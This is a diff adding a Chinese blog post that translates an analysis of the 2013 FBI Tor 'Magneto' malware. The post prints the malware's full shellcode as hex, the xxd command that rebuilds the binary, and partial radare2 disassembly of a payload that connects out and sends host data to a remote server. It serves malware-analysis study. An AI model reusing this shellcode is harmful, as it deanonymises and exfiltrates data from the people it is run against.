@@ -224,6 +224,792 @@
             
               
                 
+                <a class="post-title-link" href="/exploit/2014/08/14/fbi-tor-malware-analysis/" itemprop="url">
+                  FBI Tor Malware analysis(意译整理)
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2014-08-14T00:00:00+08:00" content="2014-08-14">
+              2014-08-14
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp; 分类于
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/exploit/" itemprop="url" rel="index">
+                    <span itemprop="name">exploit</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/exploit/2014/08/14/fbi-tor-malware-analysis/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="exploit/2014/08/14/fbi-tor-malware-analysis/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+            
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody">
+            
+              <p>感想：</p>
+<p>先说说，逆向真累，得一点点跟着函数流前进探索。靠反汇编引擎可不靠谱，跟着流程才是王道啊。</p>
+<p>注释真是非常重要，为何要用IDA真是一目了然啊</p>
+<p>来源：</p>
+<ul>
+<li><a href="http://ghowen.me/fbi-tor-malware-analysis/" target="_blank" rel="external">Analysis of the FBI Tor Malware</a></li>
+<li><a href="https://www.virustotal.com/en/file/74414c3397dc0de10fbe0adedb7f033028fe4bb57ac4f51784a6df1a7b0114f0/analysis/" target="_blank" rel="external">Virustotal</a></li>
+<li><a href="http://pastebin.com/aFUP2gLB" target="_blank" rel="external">Freedom Hosting FBI Shellcode Payload..</a></li>
+<li><a href="http://www.blizzhackers.cc/viewtopic.php?f=52&amp;t=496643&amp;start=15" target="_blank" rel="external">Re:”Remembering ‘08” Remembering Tor</a></li>
+<li><a href="http://pastebin.com/K61QZpzb" target="_blank" rel="external">redirector</a></li>
+<li><a href="http://pastebin.com/GZ1Kg3cb" target="_blank" rel="external">infector</a></li>
+<li><a href="http://pastebin.com/gVna4pi2" target="_blank" rel="external">shellcode</a></li>
+</ul>
+<p>Tor是一个让人们不被追踪地浏览网页和获取服务的匿名网络。作为这个网络的一部分，存在所谓的“<a href="http://www.zhihu.com/question/22759179" target="_blank" rel="external">暗网</a>”。这些网络只能通过Tor连接。虽然很多服务是无辜的或者抵制人权滥用，网络的匿名性也吸引了有目的的犯罪比如儿童色情。法律机构<a href="http://en.wikipedia.org/wiki/Tor\_(anonymity_network" target="_blank" rel="external">无法</a>#Hidden_services)追踪到源IP地址。</p>
+<p>2013年，在Freedom Hosting的暗网服务器上发现了一个恶意程序，该程序挖掘特定浏览器的漏洞并在用户计算机上执行程序。该程序搜集用户信息并发送到Virginia的服务器，然后使浏览器崩溃。它没有明显的恶意程序特征。因此有猜测这个程序是在Virginia有办公室的的FBI制作的。FBI<a href="http://en.wikipedia.org/wiki/Computer_and_Internet_Protocol_Address_Verifier" target="_blank" rel="external">有权编写恶意程序</a>。看起来这个猜测是<a href="http://www.wired.com/threatlevel/2013/09/freedom-hosting-fbi/" target="_blank" rel="external">真的</a>。现在已经确认为FBI代号为<a href="http://cryptome.org/2013/10/nsa-egotisticalgiraffe.pdf" target="_blank" rel="external"> EgotisticalGiraffe</a>的作品。</p>
+<h2 id="逆向之">逆向之</h2><h3 id="漏洞挖掘程序">漏洞挖掘程序</h3><p>漏洞挖掘程序是javascript写的，挖掘了一个特定版本firefox的已知bug。挖掘程序经过充分混淆但是快速扫描能找到很长的16进制字符串，在前几个字符能明显看到操作符(通常在shellcode开头有jmp或者call，知道这一点就很容易找到shellcode了)。</p>
+<p>首先，攻击者在网页中嵌入了一个链接向恶意页面的<code>iframe</code>，将受害者定向到感染页面。参见这里<a href="http://pastebin.com/bu2Ya0n6" target="_blank" rel="external">Freedom Hosting FBI IFRAME Redirector Malware Script</a>。</p>
+<p>在受害者被重定向到真正的感染页面后，在三个iframe之间执行js，进一步混淆执行流程。最终触发漏洞，注入shellcode。参见<a href="http://pastebin.com/RTwsyrH8" target="_blank" rel="external">Freedom Hosting FBI Malware Infector (ForPayload) JavaScript</a></p>
+<p>js那部分就不说了，我们看看shellcode。</p>
+<h3 id="位置独立代码">位置独立代码</h3><p>shellcode必须直接注入进程运行。它不知道自己会被注入到什么位置，也不知道Windows API函数的地址。</p>
+<p>因此，必须想些办法获取这些信息。FBI的这个程序使用了一个找到地址的常用方法：</p>
+<pre><code><span class="built_in">call</span> start
+<span class="keyword">star</span><span class="variable">t:</span>
+<span class="keyword">pop</span> ebp
+</code></pre><p><code>call start</code>做了两件事，首先，把下一个要执行的指令的地址即<code>pop ebp</code>的地址压入栈，然后跳转到<code>start</code>标签位置，就是继续执行<code>pop ebp</code>。再执行完<code>pop ebp</code>后，<code>pop ebp</code>的地址就存入了<code>ebp</code>寄存器。以此为标准就能获取shellcode中的其它数据。</p>
+<h3 id="定位Windows_API">定位Windows API</h3><p>译者：啊啊啊啊啊，都忘记这部分怎么回事了。大家可以看看</p>
+<ul>
+<li><a href="http://projectshellcode.com/?q=node/12" target="_blank" rel="external">Project shellcode上的教程</a>。</li>
+<li>有本专讲win32 shellcode的书<a href="nologin.org/Downloads/Papers/win32-shellcode.pdf">Understanding Windows Shellcode</a></li>
+<li><a href="http://www.codeproject.com/Articles/325776/The-Art-of-Win-Shellcoding" target="_blank" rel="external">The Art of Win32 Shellcoding</a></li>
+</ul>
+<p>应用程序知道Windows载入的API在哪里，但shellcode不会知道。常见方法是查看<code>fs</code>寄存器指向的<a href="http://en.wikipedia.org/wiki/Win32_Thread_Information_Block" target="_blank" rel="external">线程信息块(TIB)</a>.通过这个结构可以定位宿主程序DLL函数的位置，遍历DLL导出表知道找到函数。此过程非常无聊，所以FBI都使用了Metasploit项目<a href="https://github.com/iagox86/nbtool/blob/master/samples/shellcode-win32/block_api.asm" target="_blank" rel="external">Stephen Fewer的函数解析器</a>。</p>
+<pre><code><span class="keyword">push</span> arguments
+...
+<span class="keyword">push</span> FUNCTIONHASH
+<span class="keyword">call</span> Stephen的解析器
+</code></pre><p>函数哈希通过对函数名简单的哈希算法实现，你可以用别人做好的<a href="http://scriptjunkie1.110mb.com/hashes/index.html" target="_blank" rel="external">哈希表</a>,可以用别人的哈希计算<a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/hash.py" target="_blank" rel="external">程序</a>，甚至<a href="http://projectshellcode.com/node/21" target="_blank" rel="external">自己在shellcode中计算</a>。</p>
+<h2 id="开始">开始</h2><p>首先先获取shellcode吧，把以下一堆hex保存到<code>input.txt</code>里</p>
+<pre><code>60FCE<span class="number">88A00000060</span><span class="number">89E531D26</span><span class="number">48B52308B52</span><span class="number">0C8B52148</span>B72280FB74A2631FF31C0AC<span class="number">3C617C02</span>2C20C1CF<span class="number">0D01C7E2</span>F<span class="number">052578B52</span><span class="number">108B423C01</span>D<span class="number">08B407885</span>C<span class="number">0744A01D05</span><span class="number">08B48188B58</span><span class="number">2001D3E33</span>C<span class="number">498B348</span>B01D631FF31C0ACC1CF<span class="number">0D01C738</span>E<span class="number">075F4037</span>DF<span class="number">83B7D2475</span>E<span class="number">2588B58240</span><span class="number">1D3668B0</span>C<span class="number">4B8B581</span>C<span class="number">01D38B048</span>B<span class="number">01D08944242</span><span class="number">45B5B61595</span>A51FFE<span class="number">0585F5A8</span>B12EB<span class="number">86055D81</span>BDE<span class="number">90200004745</span><span class="number">542075708</span>D<span class="number">85D102000050</span><span class="number">684C77260</span>7FFD<span class="number">585C0745</span>E<span class="number">8D85D80200</span><span class="number">0050684C77</span>2607FFD<span class="number">585C0744</span>CBB<span class="number">9001000029</span>DC<span class="number">54536829806</span>B00FFD501DC<span class="number">85C07536505</span><span class="number">05050405040</span>5068EA0FDFE0FFD531DBF<span class="number">7D339C37</span><span class="number">41F89C36A108</span>DB<span class="number">5E102000056</span><span class="number">536899A57</span>461FFD<span class="number">585C0741</span>FFE<span class="number">8D89000000</span>75E380BD<span class="number">4F02000001</span><span class="number">7407E83B01</span>0000EB<span class="number">05E84D01000</span>0FFE<span class="number">7B80001000</span><span class="number">029C489</span>E<span class="number">252505268B64</span>9DE01FFD<span class="number">55F81C40001</span><span class="number">000085C00</span>F<span class="number">85F200000057</span>E<span class="number">8F90000005</span>E89CA8DBDE<span class="number">9020000E8</span>EB<span class="number">0000004F83</span>FA207C05BA<span class="number">2000000089</span>D<span class="number">156F3A4B90</span>D<span class="number">0000008</span>DB<span class="number">5C4020000</span>F3A489BD<span class="number">4B0200005</span>E<span class="number">5668A92834</span>80FFD<span class="number">585C00F84</span>AA<span class="number">000000668</span>B<span class="number">480A6683</span>F<span class="number">9040F829</span>C<span class="number">0000008D40</span><span class="number">0C8B008</span>B<span class="number">088B09B80</span><span class="number">00100005089</span>E<span class="number">729C489</span>E<span class="number">657565151684</span><span class="number">872D2B8</span>FFD<span class="number">585C081</span>C<span class="number">4040100000</span>FB<span class="number">70F83F90672</span>6CB<span class="number">906000000</span>B<span class="number">81000000029</span>C<span class="number">489E789</span>CAD<span class="number">1E2505231D28</span><span class="keyword">A</span><span class="number">1688D024</span>F<span class="number">0C0E8043</span>C<span class="number">0977040430</span>EB<span class="number">02043788074</span><span class="number">788D0240</span>F<span class="number">3C09770404</span>30EB<span class="number">02043788074</span><span class="number">746E2D45</span>929CF89FE5801C48BBD<span class="number">4B020000</span>F<span class="number">3A4C6854</span>F<span class="number">02000001E82</span>E<span class="number">00000031C05</span>05129CF<span class="number">4F575368</span>C2EB385FFFD<span class="number">55368756E4</span>D61FFD5E9C8FEFFFF<span class="number">31C9F7D131</span>C0F2AEF<span class="number">7D149C30000</span><span class="number">0000008</span>DBDE<span class="number">9020000E8</span>E4FFFFFF4FB<span class="number">94F0000008</span>DB<span class="number">575020000</span>F3A48DBDE<span class="number">9020000E8</span>CBFFFFFFC<span class="number">30D0A436</span>F<span class="number">6E6E65637</span><span class="number">4696F6E3</span><span class="keyword">A</span><span class="number">206B6565702</span>D<span class="number">616C69766</span><span class="number">50D0A41636</span><span class="number">36570743A202</span><span class="keyword">A</span><span class="number">2F2A0D0</span><span class="keyword">A</span><span class="number">41636365707</span><span class="number">42D456E63</span><span class="number">6F64696E67</span><span class="number">3A20677A69</span><span class="number">700D0A0</span>D<span class="number">0A0083C70</span>E<span class="number">31C9F7D131</span>C0F3AE4FFFE<span class="number">70D0A436</span>F<span class="number">6F6B69653</span><span class="keyword">A</span><span class="number">2049443D77</span><span class="number">73325F333200</span><span class="number">4950484C50</span><span class="number">415049000200</span>005041DECA<span class="number">36474554202</span>F<span class="number">303563656134</span><span class="number">64652D39353</span><span class="number">1642D34303</span><span class="number">3372D62663</span><span class="number">8662D66363</span><span class="number">93035356232</span><span class="number">37396262204</span><span class="number">85454502F31</span><span class="number">2E310D0</span><span class="keyword">A</span><span class="number">486F73743</span><span class="keyword">A</span><span class="number">200000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">00000000000</span><span class="number">0000090</span>
+</code></pre><p>然后使用<code>xxd</code>转化为二进制文件。</p>
+<pre><code>$ xxd -r -<span class="tag">p</span> hex_input<span class="class">.txt</span> magneto<span class="class">.payload</span><span class="class">.shellcode</span>
+$ ls -al magneto<span class="class">.payload</span><span class="class">.shellcode</span>
+-rw-r--r-- <span class="number">1</span> reverland reverland <span class="number">956</span> Aug <span class="number">14</span> <span class="number">19</span>:<span class="number">29</span> magneto<span class="class">.payload</span><span class="class">.shellcode</span>
+$ sha256sum magneto<span class="class">.payload</span><span class="class">.shellcode</span>
+<span class="number">74414</span>c3397dc0de10fbe0adedb7f033028fe4bb57ac4f51784a6df1a7b0114f0  magneto<span class="class">.payload</span><span class="class">.shellcode</span>
+</code></pre><p>首先反汇编shellcode：</p>
+<pre><code> ~/Work/project/reverse/<span class="keyword">test</span> ⮀ <span class="literal">r2</span> -b <span class="number">32</span> -k w32 -a x86 magneto.payload.shellcode
+ -- Everything <span class="preprocessor">up</span>-to-date.
+[<span class="number">0x00000000</span>]&gt; pD <span class="number">956</span>
+            <span class="number">0x00000000</span>    <span class="number">60</span>           <span class="keyword">pushad</span>
+            <span class="number">0x00000001</span>    fc           <span class="keyword">cld</span>
+            <span class="number">0x00000002</span>    e88a000000   <span class="keyword">call</span> <span class="number">0x91</span>
+               <span class="number">0x00000091</span>(unk)
+            <span class="number">0x00000007</span>    <span class="number">60</span>           <span class="keyword">pushad</span>
+            <span class="number">0x00000008</span>    89e5         <span class="keyword">mov</span> <span class="literal">ebp</span>, <span class="literal">esp</span>
+            <span class="number">0x0000000a</span>    31d2         <span class="keyword">xor</span> <span class="literal">edx</span>, <span class="literal">edx</span>
+            <span class="number">0x0000000c</span>    648b5230     <span class="keyword">mov</span> <span class="literal">edx</span>, [<span class="literal">fs</span>:<span class="literal">edx</span>+<span class="number">0x30</span>]
+            <span class="number">0x00000010</span>    8b520c       <span class="keyword">mov</span> <span class="literal">edx</span>, [<span class="literal">edx</span>+<span class="number">0xc</span>]
+            <span class="number">0x00000013</span>    8b5214       <span class="keyword">mov</span> <span class="literal">edx</span>, [<span class="literal">edx</span>+<span class="number">0x14</span>]
+   .------&gt; <span class="number">0x00000016</span>    8b7228       <span class="keyword">mov</span> <span class="literal">esi</span>, [<span class="literal">edx</span>+<span class="number">0x28</span>]
+   |        <span class="number">0x00000019</span>    0fb74a26     <span class="keyword">movzx</span> <span class="literal">ecx</span>, <span class="preprocessor">word</span> [<span class="literal">edx</span>+<span class="number">0x26</span>]
+   |        <span class="number">0x0000001d</span>    31ff         <span class="keyword">xor</span> <span class="literal">edi</span>, <span class="literal">edi</span>
+   |   .--&gt; <span class="number">0x0000001f</span>    31c0         <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
+   |   |    <span class="number">0x00000021</span>    ac           <span class="keyword">lodsb</span>
+   |   |    <span class="number">0x00000022</span>    3c61         <span class="keyword">cmp</span> <span class="literal">al</span>, <span class="number">0x61</span>
+   |   |,=&lt; <span class="number">0x00000024</span>    7c02         <span class="keyword">jl</span> <span class="number">0x28</span>
+   |   ||   <span class="number">0x00000026</span>    2c20         <span class="keyword">sub</span> <span class="literal">al</span>, <span class="number">0x20</span>
+   |   |<span class="string">`-&gt; 0x00000028    c1cf0d       ror edi, 0xd
+   |   |    0x0000002b    01c7         add edi, eax
+   |   `</span>==&lt; <span class="number">0x0000002d</span>    e2f0         <span class="keyword">loop</span> <span class="number">0x1f</span>
+   |        <span class="number">0x0000002f</span>    <span class="number">52</span>           <span class="keyword">push</span> <span class="literal">edx</span>
+   |        <span class="number">0x00000030</span>    <span class="number">57</span>           <span class="keyword">push</span> <span class="literal">edi</span>
+   |        <span class="number">0x00000031</span>    8b5210       <span class="keyword">mov</span> <span class="literal">edx</span>, [<span class="literal">edx</span>+<span class="number">0x10</span>]
+   |        <span class="number">0x00000034</span>    8b423c       <span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">edx</span>+<span class="number">0x3c</span>]
+   |        <span class="number">0x00000037</span>    01d0         <span class="keyword">add</span> <span class="literal">eax</span>, <span class="literal">edx</span>
+   |        <span class="number">0x00000039</span>    8b4078       <span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">eax</span>+<span class="number">0x78</span>]
+   |        <span class="number">0x0000003c</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
+   |  ,===&lt; <span class="number">0x0000003e</span>    744a         <span class="keyword">je</span> <span class="number">0x8a</span>
+   |  |     <span class="number">0x00000040</span>    01d0         <span class="keyword">add</span> <span class="literal">eax</span>, <span class="literal">edx</span>
+   |  |     <span class="number">0x00000042</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
+   |  |     <span class="number">0x00000043</span>    8b4818       <span class="keyword">mov</span> <span class="literal">ecx</span>, [<span class="literal">eax</span>+<span class="number">0x18</span>]
+   |  |     <span class="number">0x00000046</span>    8b5820       <span class="keyword">mov</span> <span class="literal">ebx</span>, [<span class="literal">eax</span>+<span class="number">0x20</span>]
+   |  |     <span class="number">0x00000049</span>    01d3         <span class="keyword">add</span> <span class="literal">ebx</span>, <span class="literal">edx</span>
+   |.-----&gt; <span class="number">0x0000004b</span>    e33c         <span class="keyword">jecxz</span> <span class="number">0x89</span>
+   || |     <span class="number">0x0000004d</span>    <span class="number">49</span>           <span class="keyword">dec</span> <span class="literal">ecx</span>
+   || |     <span class="number">0x0000004e</span>    8b348b       <span class="keyword">mov</span> <span class="literal">esi</span>, [<span class="literal">ebx</span>+<span class="literal">ecx</span>*<span class="number">4</span>]
+   || |     <span class="number">0x00000051</span>    01d6         <span class="keyword">add</span> <span class="literal">esi</span>, <span class="literal">edx</span>
+   || |     <span class="number">0x00000053</span>    31ff         <span class="keyword">xor</span> <span class="literal">edi</span>, <span class="literal">edi</span>
+   ||.----&gt; <span class="number">0x00000055</span>    31c0         <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
+   ||||     <span class="number">0x00000057</span>    ac           <span class="keyword">lodsb</span>
+   ||||     <span class="number">0x00000058</span>    c1cf0d       <span class="keyword">ror</span> <span class="literal">edi</span>, <span class="number">0xd</span>
+   ||||     <span class="number">0x0000005b</span>    01c7         <span class="keyword">add</span> <span class="literal">edi</span>, <span class="literal">eax</span>
+   ||||     <span class="number">0x0000005d</span>    38e0         <span class="keyword">cmp</span> <span class="literal">al</span>, <span class="number">ah</span>
+   ||<span class="string">`====&lt; 0x0000005f    75f4         jne 0x55
+   || |     0x00000061    037df8       add edi, [ebp-0x8]
+   || |     0x00000064    3b7d24       cmp edi, [ebp+0x24]
+   |`</span>=====&lt; <span class="number">0x00000067</span>    75e2         <span class="keyword">jne</span> <span class="number">0x4b</span>
+   |  |     <span class="number">0x00000069</span>    <span class="number">58</span>           <span class="keyword">pop</span> <span class="literal">eax</span>
+   |  |     <span class="number">0x0000006a</span>    8b5824       <span class="keyword">mov</span> <span class="literal">ebx</span>, [<span class="literal">eax</span>+<span class="number">0x24</span>]
+   |  |     <span class="number">0x0000006d</span>    01d3         <span class="keyword">add</span> <span class="literal">ebx</span>, <span class="literal">edx</span>
+   |  |     <span class="number">0x0000006f</span>    668b0c4b     <span class="keyword">mov</span> <span class="literal">cx</span>, [<span class="literal">ebx</span>+<span class="literal">ecx</span>*<span class="number">2</span>]
+   |  |     <span class="number">0x00000073</span>    8b581c       <span class="keyword">mov</span> <span class="literal">ebx</span>, [<span class="literal">eax</span>+<span class="number">0x1c</span>]
+   |  |     <span class="number">0x00000076</span>    01d3         <span class="keyword">add</span> <span class="literal">ebx</span>, <span class="literal">edx</span>
+   |  |     <span class="number">0x00000078</span>    8b048b       <span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">ebx</span>+<span class="literal">ecx</span>*<span class="number">4</span>]
+   |  |     <span class="number">0x0000007b</span>    01d0         <span class="keyword">add</span> <span class="literal">eax</span>, <span class="literal">edx</span>
+   |  |     <span class="number">0x0000007d</span>    <span class="number">89442424</span>     <span class="keyword">mov</span> [<span class="literal">esp</span>+<span class="number">0x24</span>], <span class="literal">eax</span>
+   |  |     <span class="number">0x00000081</span>    5b           <span class="keyword">pop</span> <span class="literal">ebx</span>
+   |  |     <span class="number">0x00000082</span>    5b           <span class="keyword">pop</span> <span class="literal">ebx</span>
+   |  |     <span class="number">0x00000083</span>    <span class="number">61</span>           <span class="keyword">popad</span>
+   |  |     <span class="number">0x00000084</span>    <span class="number">59</span>           <span class="keyword">pop</span> <span class="literal">ecx</span>
+   |  |     <span class="number">0x00000085</span>    5a           <span class="keyword">pop</span> <span class="literal">edx</span>
+   |  |     <span class="number">0x00000086</span>    <span class="number">51</span>           <span class="keyword">push</span> <span class="literal">ecx</span>
+   |  |     <span class="number">0x00000087</span>    ffe0         <span class="keyword">jmp</span> <span class="literal">eax</span>
+   |  |     <span class="number">0x00000089</span>    <span class="number">58</span>           <span class="keyword">pop</span> <span class="literal">eax</span>
+   |  <span class="string">`---&gt; 0x0000008a    5f           pop edi
+   |        0x0000008b    5a           pop edx
+   |        0x0000008c    8b12         mov edx, [edx]
+   `</span>======&lt; <span class="number">0x0000008e</span>    eb86         <span class="keyword">jmp</span> <span class="number">0x16</span>
+</code></pre><p>首先</p>
+<pre><code><span class="keyword">pushad</span>
+<span class="keyword">cld</span>
+</code></pre><p>将寄存器内容保存在堆栈上并清空寄存器内容。</p>
+<p>然后可以看到从<code>0x00000002</code>调用<code>0x00000091</code>。那从<code>0x00000007</code>开始是啥？参考之前stephen的函数解析器，一直到<code>0x0000008e</code>都是解析器。唉？<code>0x90</code>是啥？到<code>0x00000091</code>开始：</p>
+<pre><code>[<span class="number">0x00000000</span>]&gt; pD @<span class="number">0x91</span>
+            <span class="number">0x00000091</span>    <span class="number">5d</span>           <span class="keyword">pop</span> <span class="literal">ebp</span>
+            <span class="number">0x00000092</span>    81bde902000. <span class="keyword">cmp</span> <span class="preprocessor">dword</span> [<span class="literal">ebp</span>+<span class="number">0x2e9</span>], <span class="number">0x20544547</span>
+        ,=&lt; <span class="number">0x0000009c</span>    <span class="number">7570</span>         <span class="keyword">jne</span> <span class="number">0x10e</span>
+        |   <span class="number">0x0000009e</span>    8d85d1020000 <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>+<span class="number">0x2d1</span>]
+        |   <span class="number">0x000000a4</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
+        |   <span class="number">0x000000a5</span>    684c772607   <span class="keyword">push</span> <span class="number">0x726774c</span> <span class="comment">;  0x0726774c </span>
+        |   <span class="number">0x000000aa</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
+        |      <span class="number">0x00000000</span>(unk, unk, unk, unk, unk, unk, unk, unk)
+        |   <span class="number">0x000000ac</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
+       ,==&lt; <span class="number">0x000000ae</span>    745e         <span class="keyword">je</span> <span class="number">0x10e</span>
+       ||   <span class="number">0x000000b0</span>    8d85d8020000 <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">ebp</span>+<span class="number">0x2d8</span>]
+       ||   <span class="number">0x000000b6</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
+       ||   <span class="number">0x000000b7</span>    684c772607   <span class="keyword">push</span> <span class="number">0x726774c</span> <span class="comment">;  0x0726774c </span>
+       ||   <span class="number">0x000000bc</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
+       ||      <span class="number">0x00000000</span>(unk, unk)
+       ||   <span class="number">0x000000be</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
+      ,===&lt; <span class="number">0x000000c0</span>    744c         <span class="keyword">je</span> <span class="number">0x10e</span>
+      |||   <span class="number">0x000000c2</span>    bb90010000   <span class="keyword">mov</span> <span class="literal">ebx</span>, <span class="number">0x190</span> <span class="comment">;  0x00000190 </span>
+      |||   <span class="number">0x000000c7</span>    29dc         <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="literal">ebx</span>
+      |||   <span class="number">0x000000c9</span>    <span class="number">54</span>           <span class="keyword">push</span> <span class="literal">esp</span>
+      |||   <span class="number">0x000000ca</span>    <span class="number">53</span>           <span class="keyword">push</span> <span class="literal">ebx</span>
+      |||   <span class="number">0x000000cb</span>    6829806b00   <span class="keyword">push</span> <span class="number">0x6b8029</span> <span class="comment">;  0x006b8029 </span>
+      |||   <span class="number">0x000000d0</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
+      |||      <span class="number">0x00000000</span>(unk, unk, unk)
+      |||   <span class="number">0x000000d2</span>    01dc         <span class="keyword">add</span> <span class="literal">esp</span>, <span class="literal">ebx</span>
+      |||   <span class="number">0x000000d4</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
+     ,====&lt; <span class="number">0x000000d6</span>    <span class="number">7536</span>         <span class="keyword">jne</span> <span class="number">0x10e</span>
+     ||||   <span class="number">0x000000d8</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
+     ||||   <span class="number">0x000000d9</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
+     ||||   <span class="number">0x000000da</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
+     ||||   <span class="number">0x000000db</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
+     ||||   <span class="number">0x000000dc</span>    <span class="number">40</span>           <span class="keyword">inc</span> <span class="literal">eax</span>
+     ||||   <span class="number">0x000000dd</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
+     ||||   <span class="number">0x000000de</span>    <span class="number">40</span>           <span class="keyword">inc</span> <span class="literal">eax</span>
+     ||||   <span class="number">0x000000df</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
+     ||||   <span class="number">0x000000e0</span>    68ea0fdfe0   <span class="keyword">push</span> <span class="number">0xe0df0fea</span> <span class="comment">;  0xe0df0fea </span>
+     ||||   <span class="number">0x000000e5</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
+     ||||      <span class="number">0x00000000</span>(unk, unk, unk, unk, unk, unk, unk)
+     ||||   <span class="number">0x000000e7</span>    31<span class="pseudo">db</span>         <span class="keyword">xor</span> <span class="literal">ebx</span>, <span class="literal">ebx</span>
+     ||||   <span class="number">0x000000e9</span>    f7d3         <span class="keyword">not</span> <span class="literal">ebx</span>
+     ||||   <span class="number">0x000000eb</span>    39c3         <span class="keyword">cmp</span> <span class="literal">ebx</span>, <span class="literal">eax</span>
+    ,=====&lt; <span class="number">0x000000ed</span>    741f         <span class="keyword">je</span> <span class="number">0x10e</span>
+    |||||   <span class="number">0x000000ef</span>    89c3         <span class="keyword">mov</span> <span class="literal">ebx</span>, <span class="literal">eax</span>
+  .-------&gt; <span class="number">0x000000f1</span>    6a10         <span class="keyword">push</span> <span class="number">0x10</span> <span class="comment">;  0x00000010 </span>
+  | |||||   <span class="number">0x000000f3</span>    8db5e1020000 <span class="keyword">lea</span> <span class="literal">esi</span>, [<span class="literal">ebp</span>+<span class="number">0x2e1</span>]
+  | |||||   <span class="number">0x000000f9</span>    <span class="number">56</span>           <span class="keyword">push</span> <span class="literal">esi</span>
+  | |||||   <span class="number">0x000000fa</span>    <span class="number">53</span>           <span class="keyword">push</span> <span class="literal">ebx</span>
+  | |||||   <span class="number">0x000000fb</span>    6899a57461   <span class="keyword">push</span> <span class="number">0x6174a599</span> <span class="comment">;  0x6174a599 </span>
+  | |||||   <span class="number">0x00000100</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
+  | |||||      <span class="number">0x00000000</span>(unk, unk, unk, unk)
+  | |||||   <span class="number">0x00000102</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
+  |,======&lt; <span class="number">0x00000104</span>    741f         <span class="keyword">je</span> <span class="number">0x125</span>
+  |||||||   <span class="number">0x00000106</span>    fe8d89000000 <span class="keyword">dec</span> <span class="preprocessor">byte</span> [<span class="literal">ebp</span>+<span class="number">0x89</span>]
+  <span class="string">`=======&lt; 0x0000010c    75e3         jne 0xf1
+   |`</span><span class="string">```</span><span class="string">`-&gt; 0x0000010e    80bd4f02000. cmp byte [ebp+0x24f], 0x1
+  ========&lt; 0x00000115    7407         je 0x11e
+   |        0x00000117    e83b010000   call 0x257
+   |           0x00000257()
+  ========&lt; 0x0000011c    eb05         jmp 0x123
+  --------&gt; 0x0000011e    e84d010000   call 0x270
+          &gt;    0x00000270()
+  --------&gt; 0x00000123    ffe7         jmp edi
+   `</span>------&gt; <span class="number">0x00000125</span>    b800010000   <span class="keyword">mov</span> <span class="literal">eax</span>, <span class="number">0x100</span> <span class="comment">;  0x00000100 </span>
+            <span class="number">0x0000012a</span>    29c4         <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="literal">eax</span>
+            <span class="number">0x0000012c</span>    89e2         <span class="keyword">mov</span> <span class="literal">edx</span>, <span class="literal">esp</span>
+            <span class="number">0x0000012e</span>    <span class="number">52</span>           <span class="keyword">push</span> <span class="literal">edx</span>
+            <span class="number">0x0000012f</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
+            <span class="number">0x00000130</span>    <span class="number">52</span>           <span class="keyword">push</span> <span class="literal">edx</span>
+            <span class="number">0x00000131</span>    68b649de01   <span class="keyword">push</span> <span class="number">0x1de49b6</span> <span class="comment">;  0x01de49b6 </span>
+            <span class="number">0x00000136</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
+               <span class="number">0x00000000</span>(unk, unk, unk, unk)
+            <span class="number">0x00000138</span>    5f           <span class="keyword">pop</span> <span class="literal">edi</span>
